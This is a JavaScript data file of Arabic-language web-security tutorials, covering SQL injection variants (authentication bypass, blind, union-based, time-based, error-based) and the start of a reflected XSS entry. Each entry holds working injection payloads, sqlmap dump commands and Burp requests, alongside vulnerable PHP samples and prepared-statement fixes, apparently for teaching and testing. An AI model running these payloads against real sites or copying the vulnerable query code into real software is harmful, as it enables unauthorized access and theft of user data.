// ==========================================================================
// ملف الكاش المنعزل - يمكنك إضافة حتى 2000 ثغرة أو كورس هنا ولن تظهر إلا عند البحث عنها
// ==========================================================================

const vulnerabilitiesDatabase = [
    {
        "title": "SQL Injection (SQLi)",
        "summary": "ثغرة تسمح للمهاجم بالتدخل في الاستعلامات التي يرسلها التطبيق إلى قاعدة البيانات، مما يمكنه من عرض بيانات لا يملك صلاحية الوصول إليها أو تعديلها وتدميرها."
    },
    {
        "title": "Cross-Site Scripting (XSS)",
        "summary": "ثغرة تمكن المهاجم من زرع أكواد برمجية خبيثة (مثل جافاسكربت) داخل صفحات الموقع، لتنفذ تلقائياً في متصفح المستخدم الضحية عند زيارته للصفحة."
    },
    {
        "title": "Command Injection",
        "summary": "تحدث الثغرة عندما يقوم الموقع بتمرير مدخلات المستخدم مباشرة إلى نظام التشغيل (سيرفر الموقع) دون فحص، مما يسمح للمخترق بكتابة أوامر نظام والتحكم بالسيرفر."
    },
    {
        "title": "CSRF (Cross-Site Request Forgery)",
        "summary": "ثغرة تجبر المستخدم المصادق عليه حالياً على إرسال طلب إلى تطبيق ويب قام بتسجيل الدخول إليه مسبقاً، لتنفيذ إجراءات غير مقصودة لصالح المهاجم."
    },




    {
    "title": "SQL Injection Authentication Bypass",
    "summary": `
        <p>تعتبر ثغرة <b>SQL Injection Authentication Bypass</b> من أخطر أنواع حقن قواعد البيانات، حيث تسمح للمهاجم بتجاوز صفحة تسجيل الدخول (Login Page) والوصول إلى حسابات المستخدمين أو لوحة الإدارة دون معرفة كلمة المرور الحقيقية.</p>

        <p>تحدث هذه الثغرة عندما يقوم التطبيق ببناء استعلامات SQL اعتماداً على مدخلات المستخدم مباشرة بدون فلترة (Sanitization) أو استخدام الاستعلامات الآمنة (Prepared Statements).</p>

        <h3>كيف تعمل آلية تسجيل الدخول عادة؟</h3>

        <p>في أغلب المواقع يتم التحقق من المستخدم عبر استعلام SQL مشابه للتالي:</p>

        <pre><code>SELECT * FROM users 
WHERE username = 'admin' 
AND password = '123456';</code></pre>

        <p>إذا تطابقت البيانات مع قاعدة البيانات يتم السماح بالدخول.</p>

        <h3>المشكلة الأمنية:</h3>

        <p>إذا كان التطبيق يضع مدخلات المستخدم مباشرة داخل الاستعلام بدون حماية، يستطيع المهاجم تعديل منطق الاستعلام بالكامل.</p>

        <h3>مثال عملي على تجاوز تسجيل الدخول:</h3>

        <p>يقوم المهاجم بإدخال القيمة التالية داخل حقل اسم المستخدم:</p>

        <pre><code>' OR '1'='1</code></pre>

        <p>ويضع أي قيمة داخل كلمة المرور.</p>

        <p>فيتحول الاستعلام النهائي إلى:</p>

        <pre><code>SELECT * FROM users 
WHERE username = '' OR '1'='1' 
AND password = 'test';</code></pre>

        <p>بما أن الشرط <code>'1'='1'</code> دائماً صحيح (TRUE)، قد يعتبر النظام أن عملية التحقق ناجحة ويسمح بالدخول بدون كلمة مرور صحيحة.</p>

        <h3>أمثلة Payloads شائعة:</h3>

        <pre><code>' OR 1=1--
' OR '1'='1'--
admin' --
' OR ''='
" OR "1"="1
admin') OR ('1'='1</code></pre>

        <p>تستخدم العلامة <code>--</code> في SQL لتحويل بقية الاستعلام إلى تعليق (Comment) حتى يتم تجاهل شرط كلمة المرور.</p>

        <h3>مثال برمجي ضعيف معرض للثغرة:</h3>

        <pre><code>// PHP Example

$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users 
WHERE username='$username' 
AND password='$password'";

$result = mysqli_query($conn, $query);</code></pre>

        <p>المشكلة هنا أن التطبيق يدمج مدخلات المستخدم مباشرة داخل الاستعلام.</p>

        <h3>كيف يكتشف المختبر هذه الثغرة؟</h3>

        <p>يقوم المختبر بإرسال رموز خاصة داخل حقول تسجيل الدخول ومراقبة سلوك التطبيق:</p>

        <pre><code>'
"
--
#</code></pre>

        <p>إذا ظهرت أخطاء SQL أو تم تجاوز التحقق فهذا يعني أن النظام معرض للحقن.</p>

        <h3>اختبار عملي باستخدام Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin'--&password=test</code></pre>

        <p>إذا نجح تسجيل الدخول فهذا يدل على وجود ثغرة Authentication Bypass.</p>

        <h3>الأضرار الناتجة عن الثغرة:</h3>

        <p>1. الدخول إلى حسابات المستخدمين بدون كلمة مرور.</p>
        <p>2. الوصول إلى لوحة الإدارة (Admin Panel).</p>
        <p>3. سرقة البيانات الحساسة.</p>
        <p>4. التحكم الكامل بقاعدة البيانات.</p>
        <p>5. حذف أو تعديل معلومات المستخدمين.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Prepared Statements:</b></p>

        <pre><code>// Secure PHP PDO Example

$stmt = $pdo->prepare(
"SELECT * FROM users 
WHERE username = ? 
AND password = ?"
);

$stmt->execute([$username, $password]);</code></pre>

        <p><b>2. فلترة المدخلات والتحقق منها.</b></p>

        <p><b>3. عدم إظهار رسائل أخطاء SQL للمستخدم.</b></p>

        <p><b>4. استخدام ORM Frameworks الحديثة.</b></p>

        <p><b>5. تطبيق مبدأ أقل الصلاحيات على حساب قاعدة البيانات.</b></p>

        <h3>علامات تدل على وجود SQL Injection:</h3>

        <pre><code>SQL syntax error
mysql_fetch
ORA-01756
Unclosed quotation mark
PDOException</code></pre>

        <p>ظهور هذه الرسائل يعني غالباً أن التطبيق يتعامل مع مدخلات المستخدم بشكل غير آمن.</p>

        <h3>ملاحظات مهمة:</h3>

        <p>رغم أن ثغرة Authentication Bypass تعتبر من أقدم الثغرات، إلا أنها لا تزال من أكثر الثغرات انتشاراً بسبب سوء برمجة أنظمة تسجيل الدخول.</p>

        <p>كما أن العديد من اختبارات Bug Bounty تبدأ بفحص حقول تسجيل الدخول لاكتشاف هذا النوع من الثغرات.</p>
    `
},



{
    "title": "Blind SQL Injection في صفحات تسجيل الدخول",
    "summary": `
        <p>تعتبر ثغرة <b>Blind SQL Injection</b> من أخطر أنواع حقن قواعد البيانات لأنها تسمح للمهاجم باستخراج البيانات أو تجاوز تسجيل الدخول حتى عندما لا يعرض الموقع أي رسائل أخطاء SQL مباشرة.</p>

        <p>في هذا النوع من الثغرات لا يرى المهاجم نتائج الاستعلام بشكل مباشر، لذلك يعتمد على مراقبة سلوك التطبيق مثل:</p>

        <p>1. اختلاف استجابة الصفحة.</p>
        <p>2. اختلاف حالة تسجيل الدخول.</p>
        <p>3. تأخر الاستجابة الزمنية.</p>
        <p>4. ظهور أو اختفاء عناصر معينة.</p>

        <h3>كيف تعمل صفحة تسجيل الدخول عادة؟</h3>

        <p>يقوم التطبيق بإرسال اسم المستخدم وكلمة المرور إلى قاعدة البيانات عبر استعلام SQL مشابه للتالي:</p>

        <pre><code>SELECT * FROM users
WHERE username = 'admin'
AND password = '123456';</code></pre>

        <p>إذا كان التطبيق لا يستخدم حماية صحيحة للمدخلات، يستطيع المهاجم التلاعب بالاستعلام.</p>

        <h3>ما الفرق بين SQL Injection العادي و Blind SQL Injection ؟</h3>

        <p><b>SQL Injection العادي:</b> يعرض رسائل أخطاء SQL أو نتائج مباشرة.</p>

        <p><b>Blind SQL Injection:</b> لا يعرض أي أخطاء، ويحتاج المهاجم لتحليل سلوك التطبيق فقط.</p>

        <h3>مثال عملي على Blind Authentication Bypass:</h3>

        <p>يقوم المهاجم بإدخال القيمة التالية داخل حقل اسم المستخدم:</p>

        <pre><code>admin' AND 1=1--</code></pre>

        <p>إذا نجح تسجيل الدخول فهذا يعني أن الشرط TRUE.</p>

        <p>ثم يجرب:</p>

        <pre><code>admin' AND 1=2--</code></pre>

        <p>إذا فشل تسجيل الدخول فهذا يؤكد وجود Blind SQL Injection لأن التطبيق يتفاعل مع الشروط المنطقية.</p>

        <h3>كيف يتحول الاستعلام داخلياً؟</h3>

        <pre><code>SELECT * FROM users
WHERE username = 'admin' AND 1=1--'
AND password = 'test';</code></pre>

        <p>الجزء <code>--</code> يجعل بقية الاستعلام تعليقاً (Comment).</p>

        <h3>تقنيات Blind SQL Injection الأساسية:</h3>

        <h3>1. Boolean-Based Blind SQL Injection</h3>

        <p>يعتمد على مقارنة الاستجابة بين TRUE و FALSE.</p>

        <pre><code>admin' AND 1=1--
admin' AND 1=2--</code></pre>

        <p>إذا اختلفت الصفحة أو حالة تسجيل الدخول فهذا يعني أن التطبيق معرض للثغرة.</p>

        <h3>2. Time-Based Blind SQL Injection</h3>

        <p>يعتمد على تأخير استجابة الخادم عبر أوامر النوم (Sleep).</p>

        <pre><code>admin' AND SLEEP(5)--</code></pre>

        <p>إذا تأخرت الصفحة 5 ثوانٍ فهذا يعني أن قاعدة البيانات نفذت الأمر.</p>

        <h3>أمثلة على أوامر التأخير حسب نوع قاعدة البيانات:</h3>

        <pre><code>MySQL:
SLEEP(5)

Microsoft SQL Server:
WAITFOR DELAY '0:0:5'

PostgreSQL:
pg_sleep(5)

Oracle:
DBMS_PIPE.RECEIVE_MESSAGE(('A'),5)</code></pre>

        <h3>استخراج البيانات باستخدام Blind SQL Injection:</h3>

        <p>يمكن للمهاجم استخراج أسماء المستخدمين وكلمات المرور حرفاً حرفاً.</p>

        <p>مثال على استخراج أول حرف من اسم قاعدة البيانات:</p>

        <pre><code>admin' AND SUBSTRING(database(),1,1)='a'--</code></pre>

        <p>إذا كانت الاستجابة ناجحة فهذا يعني أن أول حرف هو a.</p>

        <h3>مثال على استخراج طول اسم قاعدة البيانات:</h3>

        <pre><code>admin' AND LENGTH(database())=5--</code></pre>

        <p>يقوم المهاجم بتجربة أرقام متعددة حتى يحصل على الاستجابة الصحيحة.</p>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin'+AND+1=1--&password=test</code></pre>

        <p>ثم تتم مقارنة الاستجابة مع:</p>

        <pre><code>username=admin'+AND+1=2--&password=test</code></pre>

        <h3>استخدام SQLMap لاكتشاف الثغرة:</h3>

        <p>sqlmap -u "http://target.com/login" --data="username=admin&password=test" --risk=3 --level=5</p>

        <p>يمكن للأداة اكتشاف Blind SQL Injection تلقائياً ومحاولة استغلالها.</p>

        <h3>علامات تدل على وجود Blind SQL Injection:</h3>

        <p>1. اختلاف حجم الصفحة عند تغيير الشروط.</p>
        <p>2. تأخر استجابة الموقع.</p>
        <p>3. نجاح تسجيل الدخول بشروط منطقية.</p>
        <p>4. اختلاف رسائل الخطأ أو إعادة التوجيه.</p>

        <h3>مثال برمجي ضعيف معرض للثغرة:</h3>

        <pre><code>// PHP Example

$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users
WHERE username='$username'
AND password='$password'";

$result = mysqli_query($conn, $query);</code></pre>

        <h3>طرق الحماية من Blind SQL Injection:</h3>

        <p><b>1. استخدام Prepared Statements:</b></p>

        <pre><code>$stmt = $pdo->prepare(
"SELECT * FROM users
WHERE username = ?
AND password = ?"
);

$stmt->execute([$username, $password]);</code></pre>

        <p><b>2. منع عرض أي أخطاء SQL.</b></p>

        <p><b>3. استخدام ORM Frameworks.</b></p>

        <p><b>4. فلترة المدخلات والتحقق منها.</b></p>

        <p><b>5. تقييد صلاحيات حساب قاعدة البيانات.</b></p>

        <h3>خطورة الثغرة:</h3>

        <p>رغم أن Blind SQL Injection أصعب في الاستغلال من SQL Injection العادي، إلا أنها تسمح للمهاجم باستخراج كامل قاعدة البيانات ببطء ودون إثارة الانتباه، ولذلك تعتبر من أخطر ثغرات تطبيقات الويب.</p>
    `
},



{
    "title": "Union Based SQL Injection",
    "summary": `
        <p>تعتبر ثغرة <b>Union Based SQL Injection</b> من أشهر تقنيات حقن قواعد البيانات، وتعتمد على استخدام جملة <code>UNION SELECT</code> لدمج نتائج استعلام المهاجم مع الاستعلام الأصلي الخاص بالتطبيق.</p>

        <p>تسمح هذه التقنية للمهاجم باستخراج البيانات الحساسة مباشرة من قاعدة البيانات مثل:</p>

        <p>1. أسماء المستخدمين.</p>
        <p>2. كلمات المرور.</p>
        <p>3. البريد الإلكتروني.</p>
        <p>4. أسماء الجداول والأعمدة.</p>
        <p>5. معلومات الخادم وقاعدة البيانات.</p>

        <h3>كيف تعمل جملة UNION في SQL ؟</h3>

        <p>تستخدم كلمة <code>UNION</code> لدمج نتائج استعلامين SQL داخل نتيجة واحدة.</p>

        <pre><code>SELECT username FROM users
UNION
SELECT email FROM customers;</code></pre>

        <p>إذا كان التطبيق يعرض نتائج الاستعلام على الصفحة، يستطيع المهاجم حقن استعلام إضافي وعرض بيانات حساسة.</p>

        <h3>مثال على استعلام ضعيف:</h3>

        <pre><code>SELECT title, description
FROM products
WHERE id = '1';</code></pre>

        <p>إذا كان التطبيق يضع مدخلات المستخدم مباشرة داخل الاستعلام، يمكن استغلاله.</p>

        <h3>مثال عملي على الاستغلال:</h3>

        <p>يقوم المهاجم بإرسال القيمة التالية داخل بارامتر ID:</p>

        <pre><code>1' UNION SELECT username,password FROM users--</code></pre>

        <p>فيتحول الاستعلام إلى:</p>

        <pre><code>SELECT title, description
FROM products
WHERE id = '1'

UNION

SELECT username,password FROM users--';</code></pre>

        <p>إذا كانت الصفحة تعرض النتائج، سيتم عرض أسماء المستخدمين وكلمات المرور بدلاً من بيانات المنتجات.</p>

        <h3>الشرط الأساسي لنجاح UNION Injection:</h3>

        <p>يجب أن يكون عدد الأعمدة في الاستعلامين متساوياً.</p>

        <p>مثال:</p>

        <pre><code>SELECT col1,col2 FROM table1
UNION
SELECT col1,col2 FROM table2;</code></pre>

        <p>إذا اختلف عدد الأعمدة ستظهر أخطاء SQL.</p>

        <h3>كيف يكتشف المهاجم عدد الأعمدة؟</h3>

        <p>عادة يستخدم المهاجم أمر <code>ORDER BY</code>.</p>

        <pre><code>1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
1' ORDER BY 4--</code></pre>

        <p>عندما يظهر خطأ SQL فهذا يعني أن الرقم تجاوز عدد الأعمدة الحقيقي.</p>

        <h3>طريقة أخرى لمعرفة عدد الأعمدة:</h3>

        <pre><code>1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--</code></pre>

        <p>يستمر المهاجم حتى تختفي الأخطاء.</p>

        <h3>تحديد الأعمدة القابلة للعرض:</h3>

        <p>بعد معرفة عدد الأعمدة، يحاول المهاجم معرفة أي الأعمدة تظهر على الصفحة.</p>

        <pre><code>1' UNION SELECT 1,2,3--</code></pre>

        <p>إذا ظهر الرقم 2 داخل الصفحة فهذا يعني أن العمود الثاني قابل للعرض.</p>

        <h3>استخراج اسم قاعدة البيانات:</h3>

        <pre><code>1' UNION SELECT database(),2--</code></pre>

        <h3>استخراج إصدار قاعدة البيانات:</h3>

        <pre><code>1' UNION SELECT version(),2--</code></pre>

        <h3>استخراج أسماء الجداول:</h3>

        <pre><code>1' UNION SELECT table_name,2
FROM information_schema.tables--</code></pre>

        <h3>استخراج أسماء الأعمدة:</h3>

        <pre><code>1' UNION SELECT column_name,2
FROM information_schema.columns
WHERE table_name='users'--</code></pre>

        <h3>استخراج بيانات المستخدمين:</h3>

        <pre><code>1' UNION SELECT username,password
FROM users--</code></pre>

        <h3>مثال عملي داخل رابط URL:</h3>

        <pre><code>http://target.com/product.php?id=1'+UNION+SELECT+username,password+FROM+users--</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>GET /product.php?id=1'+UNION+SELECT+1,2-- HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>ثم تتم مراقبة الصفحة لمعرفة ظهور النتائج.</p>

        <h3>استخدام SQLMap لاستغلال الثغرة:</h3>

        <pre><code>sqlmap -u "http://target.com/product.php?id=1" --dbs

sqlmap -u "http://target.com/product.php?id=1" -D database_name --tables

sqlmap -u "http://target.com/product.php?id=1" -D database_name -T users --dump</code></pre>

        <h3>مثال برمجي ضعيف:</h3>

        <pre><code>// PHP Example

$id = $_GET['id'];

$query = "SELECT title,description
FROM products
WHERE id='$id'";</code></pre>

        <p>المشكلة هنا أن التطبيق يدمج قيمة المستخدم مباشرة داخل الاستعلام.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Prepared Statements:</b></p>

        <pre><code>$stmt = $pdo->prepare(
"SELECT title,description
FROM products
WHERE id=?"
);

$stmt->execute([$id]);</code></pre>

        <p><b>2. فلترة المدخلات الرقمية.</b></p>

        <p><b>3. منع عرض أخطاء SQL للمستخدم.</b></p>

        <p><b>4. استخدام ORM Frameworks الحديثة.</b></p>

        <p><b>5. تقليل صلاحيات حساب قاعدة البيانات.</b></p>

        <h3>علامات تدل على وجود Union Based SQL Injection:</h3>

        <pre><code>UNION SELECT
ORDER BY
SQL syntax error
mysql_fetch
ORA-01789
Column count doesn't match</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Union Based SQL Injection من أخطر الثغرات لأنها تسمح بعرض البيانات الحساسة مباشرة داخل صفحات الموقع، وفي كثير من الحالات تؤدي إلى اختراق كامل لقاعدة البيانات وسرقة معلومات المستخدمين.</p>
    `
},



{
    "title": "Time-Based Blind SQL Injection",
    "summary": `
        <p>تعتبر ثغرة <b>Time-Based Blind SQL Injection</b> من أخطر أنواع حقن قواعد البيانات الصامتة (Blind SQL Injection)، حيث يعتمد المهاجم على مراقبة الزمن الذي يستغرقه الخادم في الرد بدلاً من رؤية نتائج الاستعلام أو رسائل الأخطاء.</p>

        <p>في هذا النوع من الثغرات لا يعرض الموقع أي معلومات مباشرة، لذلك يقوم المهاجم بإرسال استعلامات تؤدي إلى تأخير الاستجابة عمداً، وإذا تأخر الخادم فهذا يعني أن قاعدة البيانات نفذت الأمر بنجاح.</p>

        <h3>فكرة عمل الثغرة:</h3>

        <p>يقوم المهاجم بحقن أوامر تؤدي إلى "Sleep" أو "Delay" داخل استعلام SQL.</p>

        <p>إذا تأخرت الصفحة فهذا يدل على أن الشرط المحقون TRUE وتم تنفيذ الأمر.</p>

        <h3>مثال على صفحة تسجيل دخول ضعيفة:</h3>

        <pre><code>SELECT * FROM users
WHERE username = 'admin'
AND password = '123456';</code></pre>

        <p>إذا كان التطبيق يدمج مدخلات المستخدم مباشرة داخل الاستعلام، يصبح معرضاً للثغرة.</p>

        <h3>مثال عملي على الاختبار:</h3>

        <p>يقوم المهاجم بإدخال القيمة التالية داخل حقل اسم المستخدم:</p>

        <pre><code>admin' AND SLEEP(5)--</code></pre>

        <p>إذا استغرق الموقع 5 ثوانٍ للرد فهذا يعني أن قاعدة البيانات نفذت الأمر.</p>

        <h3>كيف يتحول الاستعلام داخلياً؟</h3>

        <pre><code>SELECT * FROM users
WHERE username = 'admin'
AND SLEEP(5)--'
AND password = 'test';</code></pre>

        <p>الجزء <code>--</code> يحول بقية الاستعلام إلى تعليق (Comment).</p>

        <h3>لماذا تعتبر Blind ؟</h3>

        <p>لأن الموقع لا يعرض أي بيانات أو أخطاء SQL مباشرة، والمهاجم يعتمد فقط على اختلاف زمن الاستجابة.</p>

        <h3>أوامر التأخير حسب نوع قاعدة البيانات:</h3>

        <h3>MySQL:</h3>

        <pre><code>SLEEP(5)</code></pre>

        <h3>Microsoft SQL Server:</h3>

        <pre><code>WAITFOR DELAY '0:0:5'</code></pre>

        <h3>PostgreSQL:</h3>

        <pre><code>pg_sleep(5)</code></pre>

        <h3>Oracle:</h3>

        <pre><code>DBMS_PIPE.RECEIVE_MESSAGE(('A'),5)</code></pre>

        <h3>اختبار TRUE و FALSE:</h3>

        <p>يقوم المهاجم أولاً بإرسال شرط صحيح:</p>

        <pre><code>admin' AND SLEEP(5)--</code></pre>

        <p>ثم يرسل شرط خاطئ:</p>

        <pre><code>admin' AND 1=2 AND SLEEP(5)--</code></pre>

        <p>إذا حدث التأخير فقط مع الشرط الأول فهذا يؤكد وجود الثغرة.</p>

        <h3>استخراج البيانات حرفاً حرفاً:</h3>

        <p>يمكن للمهاجم استخراج البيانات الحساسة عبر اختبار الأحرف.</p>

        <h3>مثال على استخراج أول حرف من اسم قاعدة البيانات:</h3>

        <pre><code>admin' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--</code></pre>

        <p>إذا تأخر الموقع فهذا يعني أن أول حرف هو a.</p>

        <h3>مثال على استخراج طول اسم قاعدة البيانات:</h3>

        <pre><code>admin' AND IF(LENGTH(database())=5,SLEEP(5),0)--</code></pre>

        <h3>استخراج أسماء الجداول:</h3>

        <pre><code>admin' AND IF(
SUBSTRING(
(
SELECT table_name
FROM information_schema.tables
LIMIT 0,1
),1,1)='u',
SLEEP(5),
0)--</code></pre>

        <h3>استغلال الثغرة عبر رابط URL:</h3>

        <pre><code>http://target.com/login.php?user=admin'+AND+SLEEP(5)--</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin'+AND+SLEEP(5)--&password=test</code></pre>

        <p>ثم تتم مراقبة زمن الاستجابة داخل Burp Repeater.</p>

        <h3>استخدام SQLMap لاكتشاف الثغرة:</h3>

        <pre><code>sqlmap -u "http://target.com/login.php" 
--data="username=admin&password=test"
--technique=T</code></pre>

        <p>الخيار <code>--technique=T</code> يجبر SQLMap على استخدام Time-Based Injection فقط.</p>

        <h3>علامات تدل على وجود Time-Based Blind SQL Injection:</h3>

        <p>1. تأخر استجابة الموقع عند إدخال أوامر Sleep.</p>
        <p>2. اختلاف الزمن بين TRUE و FALSE.</p>
        <p>3. عدم ظهور أخطاء SQL رغم وجود سلوك غير طبيعي.</p>
        <p>4. نجاح تنفيذ شروط منطقية مرتبطة بالوقت.</p>

        <h3>مثال برمجي ضعيف:</h3>

        <pre><code>// PHP Example

$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users
WHERE username='$username'
AND password='$password'";

$result = mysqli_query($conn, $query);</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Prepared Statements:</b></p>

        <pre><code>$stmt = $pdo->prepare(
"SELECT * FROM users
WHERE username = ?
AND password = ?"
);

$stmt->execute([$username, $password]);</code></pre>

        <p><b>2. فلترة المدخلات والتحقق منها.</b></p>

        <p><b>3. منع عرض أخطاء SQL أو اختلافات الاستجابة.</b></p>

        <p><b>4. تحديد وقت أقصى لتنفيذ الاستعلامات.</b></p>

        <p><b>5. استخدام Web Application Firewall (WAF).</b></p>

        <h3>خطورة الثغرة:</h3>

        <p>رغم أن Time-Based Blind SQL Injection بطيئة في استخراج البيانات، إلا أنها تعتبر من أخطر أنواع SQL Injection لأنها تعمل حتى عندما تكون رسائل الأخطاء مخفية بالكامل، ويمكن للمهاجم عبرها استخراج قواعد البيانات كاملة دون الحاجة لرؤية أي نتائج مباشرة.</p>
    `
},



{
    "title": "Error-Based SQL Injection",
    "summary": `
        <p>تعتبر ثغرة <b>Error-Based SQL Injection</b> من أشهر أنواع حقن قواعد البيانات، وتعتمد على استغلال رسائل أخطاء SQL التي يعرضها التطبيق للمستخدم عند حدوث خطأ داخل الاستعلام.</p>

        <p>يقوم المهاجم بإرسال مدخلات غير طبيعية أو استعلامات مكسورة عمداً لإجبار قاعدة البيانات على إظهار معلومات حساسة داخل رسالة الخطأ.</p>

        <p>هذه الرسائل قد تكشف:</p>

        <p>1. نوع قاعدة البيانات المستخدمة.</p>
        <p>2. أسماء الجداول والأعمدة.</p>
        <p>3. بنية الاستعلامات الداخلية.</p>
        <p>4. مسارات الملفات داخل الخادم.</p>
        <p>5. معلومات حساسة من قاعدة البيانات.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يعرض التطبيق أخطاء SQL مباشرة للمستخدم بدلاً من إخفائها.</p>

        <p>مثال على كود ضعيف:</p>

        <pre><code>// PHP Example

$id = $_GET['id'];

$query = "SELECT * FROM products
WHERE id='$id'";

$result = mysqli_query($conn, $query);</code></pre>

        <p>إذا أدخل المستخدم قيماً غير متوقعة، ستظهر أخطاء قاعدة البيانات مباشرة.</p>

        <h3>مثال عملي على اكتشاف الثغرة:</h3>

        <p>يقوم المهاجم بإضافة علامة اقتباس داخل الرابط:</p>

        <pre><code>http://target.com/product.php?id=1'</code></pre>

        <p>إذا ظهر خطأ مشابه للتالي فهذا يدل على وجود SQL Injection:</p>

        <pre><code>You have an error in your SQL syntax

mysql_fetch_array()

Unclosed quotation mark after the character string</code></pre>

        <h3>كيف يستغل المهاجم الأخطاء؟</h3>

        <p>يستخدم المهاجم دوال SQL تؤدي إلى أخطاء تحتوي على بيانات حساسة داخل رسالة الخطأ نفسها.</p>

        <h3>استخراج إصدار قاعدة البيانات:</h3>

        <pre><code>1' AND extractvalue(1,concat(0x7e,version()))--</code></pre>

        <p>إذا كانت قاعدة البيانات MySQL سيظهر الخطأ بالشكل التالي:</p>

        <pre><code>XPATH syntax error: '~8.0.36'</code></pre>

        <p>وهذا يكشف إصدار قاعدة البيانات.</p>

        <h3>استخراج اسم قاعدة البيانات:</h3>

        <pre><code>1' AND extractvalue(1,concat(0x7e,database()))--</code></pre>

        <h3>استخراج المستخدم الحالي:</h3>

        <pre><code>1' AND extractvalue(1,concat(0x7e,user()))--</code></pre>

        <h3>شرح الدالة extractvalue():</h3>

        <p>تستخدم الدالة <code>extractvalue()</code> لمعالجة XML، ولكن عند تمرير قيمة غير صحيحة تقوم بإظهار رسالة خطأ تحتوي على البيانات المحقونة.</p>

        <h3>تقنيات Error-Based Injection الشائعة:</h3>

        <h3>1. extractvalue()</h3>

        <pre><code>extractvalue(1,concat(0x7e,version()))</code></pre>

        <h3>2. updatexml()</h3>

        <pre><code>updatexml(1,concat(0x7e,database()),1)</code></pre>

        <h3>3. floor(rand()) Exploit</h3>

        <pre><code>SELECT COUNT(*),
CONCAT(database(),FLOOR(RAND(0)*2))
x FROM information_schema.tables
GROUP BY x;</code></pre>

        <p>يمكن أن يؤدي إلى أخطاء تحتوي على اسم قاعدة البيانات.</p>

        <h3>استخراج أسماء الجداول:</h3>

        <pre><code>1' AND extractvalue(
1,
concat(
0x7e,
(
SELECT table_name
FROM information_schema.tables
LIMIT 0,1
)
)
)--</code></pre>

        <h3>استخراج أسماء الأعمدة:</h3>

        <pre><code>1' AND extractvalue(
1,
concat(
0x7e,
(
SELECT column_name
FROM information_schema.columns
WHERE table_name='users'
LIMIT 0,1
)
)
)--</code></pre>

        <h3>استخراج بيانات المستخدمين:</h3>

        <pre><code>1' AND extractvalue(
1,
concat(
0x7e,
(
SELECT username
FROM users
LIMIT 0,1
)
)
)--</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>GET /product.php?id=1'+AND+extractvalue(1,concat(0x7e,version()))-- HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>ثم تتم مراقبة الاستجابة لمعرفة ظهور البيانات داخل رسالة الخطأ.</p>

        <h3>استخدام SQLMap لاكتشاف الثغرة:</h3>

        <pre><code>sqlmap -u "http://target.com/product.php?id=1"
--technique=E</code></pre>

        <p>الخيار <code>--technique=E</code> يجبر SQLMap على استخدام Error-Based Injection فقط.</p>

        <h3>علامات تدل على وجود Error-Based SQL Injection:</h3>

        <pre><code>SQL syntax error
mysql_fetch_array()
ORA-01756
PDOException
Unclosed quotation mark
XPATH syntax error</code></pre>

        <h3>أنواع قواعد البيانات القابلة للاستغلال:</h3>

        <p>1. MySQL</p>
        <p>2. Microsoft SQL Server</p>
        <p>3. PostgreSQL</p>
        <p>4. Oracle</p>

        <h3>مثال على استعلام ضعيف:</h3>

        <pre><code>SELECT * FROM products
WHERE id = '$id';</code></pre>

        <p>إذا لم تتم فلترة المدخلات بشكل صحيح يمكن حقن استعلامات خبيثة بسهولة.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Prepared Statements:</b></p>

        <pre><code>$stmt = $pdo->prepare(
"SELECT * FROM products
WHERE id=?"
);

$stmt->execute([$id]);</code></pre>

        <p><b>2. إخفاء رسائل أخطاء SQL عن المستخدم.</b></p>

        <p><b>3. تسجيل الأخطاء داخلياً فقط داخل Logs.</b></p>

        <p><b>4. فلترة المدخلات والتحقق منها.</b></p>

        <p><b>5. استخدام ORM Frameworks الحديثة.</b></p>

        <p><b>6. تطبيق Web Application Firewall (WAF).</b></p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Error-Based SQL Injection من أخطر أنواع SQL Injection لأنها تسهل على المهاجم استخراج المعلومات بسرعة كبيرة من خلال رسائل الأخطاء فقط، وغالباً تكون أول خطوة في اختراق قواعد البيانات والتطبيقات الضعيفة.</p>
    `
},


{
    "title": "Cross Site Scripting (XSS) Reflected",
    "summary": `
        <p>تعتبر ثغرة <b>Reflected Cross Site Scripting (Reflected XSS)</b> من أشهر ثغرات تطبيقات الويب، وتحدث عندما يقوم الموقع بعرض مدخلات المستخدم داخل الصفحة مباشرة بدون فلترة أو ترميز (Encoding) مناسب.</p>

        <p>تسمح هذه الثغرة للمهاجم بحقن أكواد JavaScript خبيثة يتم تنفيذها داخل متصفح الضحية عند فتح رابط خبيث أو إرسال طلب معين.</p>

        <h3>كيف تعمل الثغرة؟</h3>

        <p>يقوم التطبيق باستقبال قيمة من المستخدم ثم يعرضها مباشرة داخل الصفحة.</p>

        <p>مثال على رابط بحث:</p>

        <pre><code>http://target.com/search?q=phone</code></pre>

        <p>يقوم الموقع بعرض نتيجة مشابهة:</p>

        <pre><code>You searched for: phone</code></pre>

        <p>إذا لم يتم فلترة المدخلات بشكل صحيح يستطيع المهاجم إدخال كود JavaScript بدلاً من النص العادي.</p>

        <h3>مثال عملي على الاستغلال:</h3>

        <pre><code>http://target.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

        <p>إذا كان الموقع معرضاً للثغرة سيتم تنفيذ الكود داخل متصفح الضحية وظهور نافذة Alert.</p>

